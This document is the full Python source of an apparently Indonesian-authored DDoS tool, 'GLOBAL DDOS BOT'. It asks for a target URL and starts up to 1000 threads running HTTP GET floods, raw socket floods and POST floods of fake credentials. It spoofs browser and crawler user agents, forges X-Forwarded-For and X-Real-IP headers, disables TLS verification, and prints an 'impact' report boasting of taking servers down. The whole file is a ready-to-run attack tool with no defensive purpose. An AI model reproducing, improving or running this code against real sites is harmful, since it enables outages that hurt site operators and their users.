#!/usr/bin/env python3
"""
ULTIMATE_DDOS_GLOBAL.py - DDOS Bot dengan User Agent Global & Performance Max
"""

import threading
import time
import random
import socket
import requests
import urllib3
import ssl
import json
import datetime
import os
import sys
from urllib.parse import urlparse

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context

class GlobalDDoSBot:
    def __init__(self):
        self.attack_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.running = True
        self.lock = threading.Lock()
        self.start_time = None
        
        # USER AGENT GLOBAL SUPER LENGKAP
        self.user_agents = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
            
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            
            # Opera
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0',
            
            # Mobile
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # Bot-like (untuk variasi)
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
        ]
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        print("""
    \033[91m╔══════════════════════════════════════════════╗
    ║              \033[97mGLOBAL DDOS BOT\033[91m                 ║
    ║              \033[93mLEVEL DEWA 20\033[91m                   ║
    ║         \033[97m200-1000 THREADS POWER\033[91m               ║
    ║           \033[92mREAL TRAFFIC • NO FAKE\033[91m             ║
    ╚══════════════════════════════════════════════╝\033[0m
        """)
    
    def get_random_headers(self):
        """Generate headers dengan user agent global"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id,en;q=0.8', 'fr,en;q=0.7']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
    
    def http_flood_attack(self, target, thread_id):
        """HTTP Flood Attack dengan session reuse"""
        session = requests.Session()
        session.verify = False
        
        # Setup adapter untuk performance
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        request_count = 0
        
        while self.running:
            try:
                headers = self.get_random_headers()
                response = session.get(target, headers=headers, timeout=5)
                
                with self.lock:
                    self.attack_count += 1
                    request_count += 1
                    if response.status_code in [200, 201, 202, 301, 302]:
                        self.success_count += 1
                
                # Progress per thread
                if request_count % 50 == 0:
                    elapsed = time.time() - self.start_time
                    rps = self.attack_count / elapsed if elapsed > 0 else 0
                    print(f"\033[94m[Thread-{thread_id:03d}]\033[0m Requests: {request_count} | Global RPS: {rps:.0f}")
                    
            except Exception as e:
                with self.lock:
                    self.attack_count += 1
                    self.failed_count += 1
    
    def socket_flood_attack(self, target, thread_id):
        """Raw Socket Flood Attack untuk maximum performance"""
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        request_count = 0
        
        while self.running:
            try:
                # Create socket dengan timeout pendek
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Connect dan kirim request
                sock.connect((host, port))
                
                # Build HTTP request dengan random user agent
                user_agent = random.choice(self.user_agents)
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                
                sock.send(request.encode())
                request_count += 1
                
                with self.lock:
                    self.attack_count += 1
                    self.success_count += 1
                
                sock.close()
                
                # Progress
                if request_count % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rps = self.attack_count / elapsed if elapsed > 0 else 0
                    print(f"\033[92m[Socket-{thread_id:03d}]\033[0m Requests: {request_count} | Global RPS: {rps:.0f}")
                
            except Exception:
                with self.lock:
                    self.attack_count += 1
                    self.failed_count += 1
    
    def post_flood_attack(self, target, thread_id):
        """POST Flood Attack untuk variasi"""
        session = requests.Session()
        session.verify = False
        
        request_count = 0
        
        while self.running:
            try:
                headers = self.get_random_headers()
                
                # Random POST data
                post_data = {
                    'username': f'user{random.randint(1000,9999)}',
                    'password': f'pass{random.randint(10000,99999)}',
                    'email': f'test{random.randint(1000,9999)}@gmail.com'
                }
                
                response = session.post(target, data=post_data, headers=headers, timeout=5)
                
                with self.lock:
                    self.attack_count += 1
                    request_count += 1
                    if response.status_code in [200, 201, 302]:
                        self.success_count += 1
                
                if request_count % 40 == 0:
                    elapsed = time.time() - self.start_time
                    rps = self.attack_count / elapsed if elapsed > 0 else 0
                    print(f"\033[95m[POST-{thread_id:03d}]\033[0m Requests: {request_count} | Global RPS: {rps:.0f}")
                    
            except Exception:
                with self.lock:
                    self.attack_count += 1
                    self.failed_count += 1
    
    def start_global_ddos(self):
        """Start GLOBAL DDOS Attack dengan multiple techniques"""
        self.clear_screen()
        self.show_banner()
        
        # Input target
        target = input("\033[96m🎯 Enter target URL: \033[0m").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Test target
        print(f"\033[93m🔍 Testing target {target}...\033[0m")
        try:
            test_response = requests.get(target, timeout=10, verify=False)
            print(f"\033[92m✅ Target is alive! Status: {test_response.status_code}\033[0m")
        except Exception as e:
            print(f"\033[91m❌ Target error: {e}\033[0m")
            input("\nPress Enter to continue...")
            return
        
        # Pilih kekuatan thread
        print("\n\033[96m⚡ Pilih Kekuatan Thread:\033[0m")
        print("1. 🚀 TURBO 200 Threads")
        print("2. ⚡ EXTREME 400 Threads")
        print("3. 💀 NUCLEAR 700 Threads")
        print("4. 🌪️  DEWA 1000 Threads")
        
        choice = input("\n\033[96mPilih [1-4]: \033[0m").strip()
        thread_map = {"1": 200, "2": 400, "3": 700, "4": 1000}
        threads = thread_map.get(choice, 200)
        
        # Duration
        try:
            duration = int(input("\n\033[96m⏰ Duration (minutes) [3]: \033[0m").strip() or "3")
        except:
            duration = 3
        
        # Konfirmasi
        print(f"\n\033[93m🎯 Target: {target}")
        print(f"💀 Threads: {threads}")
        print(f"⏰ Duration: {duration} minutes")
        print(f"🌍 User Agents: {len(self.user_agents)} global agents\033[0m")
        
        confirm = input("\n\033[91mType 'ATTACK' to launch GLOBAL DDOS: \033[0m").strip()
        if confirm != "ATTACK":
            return
        
        # Setup attack
        self.attack_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.running = True
        self.start_time = time.time()
        end_time = self.start_time + (duration * 60)
        
        print(f"\n\033[92m💀 LAUNCHING GLOBAL DDOS ATTACK...\033[0m")
        print("\033[93m⚠️  Press Ctrl+C to stop attack\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")
        
        # Start BOTS dalam berbagai teknik
        bot_threads = []
        
        # Distribusi techniques
        http_threads = int(threads * 0.4)    # 40% HTTP Flood
        socket_threads = int(threads * 0.4)  # 40% Socket Flood  
        post_threads = threads - http_threads - socket_threads  # 20% POST Flood
        
        print(f"\033[94m🤖 Starting {http_threads} HTTP Bots...\033[0m")
        for i in range(http_threads):
            thread = threading.Thread(target=self.http_flood_attack, args=(target, i))
            thread.daemon = True
            thread.start()
            bot_threads.append(thread)
        
        print(f"\033[92m🤖 Starting {socket_threads} Socket Bots...\033[0m")
        for i in range(socket_threads):
            thread = threading.Thread(target=self.socket_flood_attack, args=(target, i + http_threads))
            thread.daemon = True
            thread.start()
            bot_threads.append(thread)
        
        print(f"\033[95m🤖 Starting {post_threads} POST Bots...\033[0m")
        for i in range(post_threads):
            thread = threading.Thread(target=self.post_flood_attack, args=(target, i + http_threads + socket_threads))
            thread.daemon = True
            thread.start()
            bot_threads.append(thread)
        
        print(f"\033[92m✅ Total {threads} BOTS activated!\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")
        
        # REAL-TIME MONITORING
        last_count = 0
        peak_rps = 0
        
        try:
            while time.time() < end_time and self.running:
                time.sleep(2)
                current_count = self.attack_count
                elapsed = time.time() - self.start_time
                
                if elapsed > 0:
                    current_rps = (current_count - last_count) / 2
                    total_rps = current_count / elapsed
                    success_rate = (self.success_count / current_count * 100) if current_count > 0 else 0
                    time_left = (end_time - time.time()) / 60
                    
                    # Update peak RPS
                    if total_rps > peak_rps:
                        peak_rps = total_rps
                    
                    # Live display dengan colors
                    print(f"\033[97m📊 LIVE: \033[93m{current_count:,}\033[97m req | "
                          f"\033[92mRPS: {total_rps:.0f}\033[97m | "
                          f"\033[96mSuccess: {success_rate:.1f}%\033[97m | "
                          f"\033[95mTime Left: {time_left:.1f}m\033[0m")
                    
                    last_count = current_count
                    
        except KeyboardInterrupt:
            print("\n\033[91m🛑 DDOS stopped by user!\033[0m")
        
        self.running = False
        total_time = time.time() - self.start_time
        
        # FINAL REPORT
        self.generate_report(target, threads, total_time, peak_rps)
    
    def generate_report(self, target, threads, total_time, peak_rps):
        """Generate detailed attack report"""
        self.clear_screen()
        print("""
    \033[91m╔══════════════════════════════════════════════╗
    ║                \033[97mATTACK REPORT\033[91m                  ║
    ║              \033[93mGLOBAL DDOS BOT\033[91m                  ║
    ╚══════════════════════════════════════════════╝\033[0m
        """)
        
        success_rate = (self.success_count / self.attack_count * 100) if self.attack_count > 0 else 0
        
        print(f"\033[96m🎯 Target:\033[97m {target}")
        print(f"\033[96m🤖 Bots Used:\033[97m {threads} threads")
        print(f"\033[96m⏰ Attack Duration:\033[97m {total_time:.2f} seconds")
        print(f"\033[96m📨 Total Requests:\033[97m {self.attack_count:,}")
        print(f"\033[96m✅ Successful:\033[92m {self.success_count:,}")
        print(f"\033[96m❌ Failed:\033[91m {self.failed_count:,}")
        print(f"\033[96m🚀 Average RPS:\033[97m {self.attack_count/total_time:.0f}")
        print(f"\033[96m📈 Peak RPS:\033[93m {peak_rps:.0f}")
        print(f"\033[96m🎯 Success Rate:\033[97m {success_rate:.1f}%")
        print(f"\033[96m🌍 User Agents:\033[97m {len(self.user_agents)} global agents")
        
        # Impact assessment
        if success_rate > 80:
            impact = "\033[92m💀 TOTAL DESTRUCTION - SERVER DOWN!\033[0m"
        elif success_rate > 60:
            impact = "\033[93m🔥 HEAVY DAMAGE - SERVER STRUGGLING!\033[0m"
        elif success_rate > 40:
            impact = "\033[96m⚡ MODERATE IMPACT - SERVER UNDER STRESS!\033[0m"
        else:
            impact = "\033[91m🛡️ LIGHT IMPACT - SERVER RESISTING\033[0m"
        
        print(f"\033[96m💥 Impact Level:\033[0m {impact}")
        print(f"\033[96m🕐 Finished:\033[97m {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        input("\n\033[93mPress Enter to continue...\033[0m")

def main():
    try:
        bot = GlobalDDoSBot()
        bot.start_global_ddos()
    except KeyboardInterrupt:
        print("\n\033[91m👋 Program dihentikan!\033[0m")
    except Exception as e:
        print(f"\n\033[91m💥 Error: {e}\033[0m")

if __name__ == "__main__":
    main()